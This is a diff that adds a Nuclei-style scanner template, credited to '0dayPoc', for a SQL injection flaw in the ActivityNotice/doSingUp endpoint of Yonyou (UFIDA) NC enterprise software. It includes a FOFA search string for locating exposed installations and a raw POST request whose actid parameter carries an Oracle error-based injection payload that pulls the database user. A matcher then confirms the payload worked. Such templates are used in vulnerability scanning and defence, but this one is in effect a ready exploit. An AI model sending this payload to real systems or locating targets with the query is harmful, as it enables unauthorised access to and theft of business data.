@@ -1,0 +1,25 @@
+id: yonyou-nc-dosingup-sqli
+
+info:
+  name: 用友NC系统ActivityNotice/doSingUp接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+          用友NC系统的ActivityNotice/doSingUp接口存在SQL注入漏洞。攻击者可通过构造恶意SQL请求参数利用该漏洞，导致身份验证绕过、敏感数据泄露，进而可能实现数据篡改或系统权限提升。该缺陷可能对系统的数据完整性及业务连续性造成严重威胁。
+  tags: 用友NC
+
+http:
+- raw:
+  - |
+    POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    pageId=login&pk_psndoc=1&actid=1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'SYS.UTL_INADDR'
